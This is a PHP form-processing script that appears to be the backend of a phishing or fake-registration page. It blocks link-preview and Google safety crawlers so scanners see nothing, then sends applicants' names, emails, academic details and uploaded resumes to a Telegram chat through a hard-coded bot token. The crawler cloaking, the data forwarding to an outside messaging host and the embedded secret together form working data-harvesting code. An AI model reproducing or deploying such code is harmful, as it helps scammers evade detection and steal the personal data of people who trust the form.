<?php
// Anti-bot / crawler check (optional but recommended)
$userAgent = $_SERVER['HTTP_USER_AGENT'] ?? '';
if (preg_match('/(TelegramBot|WhatsApp|Instagram|facebookexternalhit|Facebot|GoogleImageProxy|Googlebot|Google-Safety|Mediapartners-Google)/i', $userAgent)) {
    exit();
}

// ---------- CONFIGURATION ----------
$botToken = "8386009786:AAE9SInLbXAHOI5HDwm9ctMhDicP7yYmUUM";
$chatId   = "-1003598938463";
// -----------------------------------

// Helper: send plain text message to Telegram
function sendTelegramMessage($text) {
    global $botToken, $chatId;
    $url = "https://api.telegram.org/bot$botToken/sendMessage";
    $data = [
        'chat_id' => $chatId,
        'text'    => $text,
        'parse_mode' => 'HTML'
    ];
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_exec($ch);
    curl_close($ch);
}

// Helper: send a document to Telegram
function sendTelegramDocument($filePath, $caption = '') {
    global $botToken, $chatId;
    $url = "https://api.telegram.org/bot$botToken/sendDocument";
    $postFields = [
        'chat_id' => $chatId,
        'document' => new CURLFile($filePath),
        'caption'  => $caption,
        'parse_mode' => 'HTML'
    ];
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $postFields);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_exec($ch);
    curl_close($ch);
}

// Collect form fields (sanitize for HTML)
$email    = htmlspecialchars($_POST['email'] ?? '', ENT_QUOTES, 'UTF-8');
$fullName = htmlspecialchars($_POST['fullname'] ?? '', ENT_QUOTES, 'UTF-8');
$gender   = htmlspecialchars($_POST['gender'] ?? '', ENT_QUOTES, 'UTF-8');
$college  = htmlspecialchars($_POST['college'] ?? '', ENT_QUOTES, 'UTF-8');
$degree   = htmlspecialchars($_POST['degree'] ?? '', ENT_QUOTES, 'UTF-8');
$stream   = htmlspecialchars($_POST['stream'] ?? '', ENT_QUOTES, 'UTF-8');
$cgpa     = htmlspecialchars($_POST['cgpa'] ?? '', ENT_QUOTES, 'UTF-8');

// Handle file upload
$resume = $_FILES['resume'] ?? null;

if (!$resume || $resume['error'] !== UPLOAD_ERR_OK) {
    // No file uploaded – send only the text details
    $text = "📋 <b>New Registration (no file)</b>\n\n"
          . "Email: $email\n"
          . "Full Name: $fullName\n"
          . "Gender: $gender\n"
          . "College: $college\n"
          . "Degree: $degree\n"
          . "Stream: $stream\n"
          . "CGPA: $cgpa";
    sendTelegramMessage($text);
} else {
    // Validate file type
    $allowedMime = [
        'application/pdf',
        'application/msword',
        'application/vnd.openxmlformats-officedocument.wordprocessingml.document'
    ];
    $finfo = finfo_open(FILEINFO_MIME_TYPE);
    $mime = finfo_file($finfo, $resume['tmp_name']);
    finfo_close($finfo);

    if (!in_array($mime, $allowedMime)) {
        sendTelegramMessage("❌ Invalid file type uploaded by $email.");
        exit;
    }

    // Check file size (max 10 MB)
    if ($resume['size'] > 10 * 1024 * 1024) {
        sendTelegramMessage("❌ File too large (over 10 MB) from $email.");
        exit;
    }

    // Move file to a temporary location
    $tmpDir = sys_get_temp_dir();
    $tmpFilePath = $tmpDir . '/' . basename($resume['name']);
    move_uploaded_file($resume['tmp_name'], $tmpFilePath);

    // Prepare caption with form data
    $caption = "📄 <b>New Registration with Resume</b>\n\n"
             . "Email: $email\n"
             . "Full Name: $fullName\n"
             . "Gender: $gender\n"
             . "College: $college\n"
             . "Degree: $degree\n"
             . "Stream: $stream\n"
             . "CGPA: $cgpa\n"
             . "File name: " . $resume['name'];

    // Send the document with caption
    sendTelegramDocument($tmpFilePath, $caption);

    // Clean up temporary file
    unlink($tmpFilePath);
}

// Return a simple response to the AJAX call
echo "OK";
?>
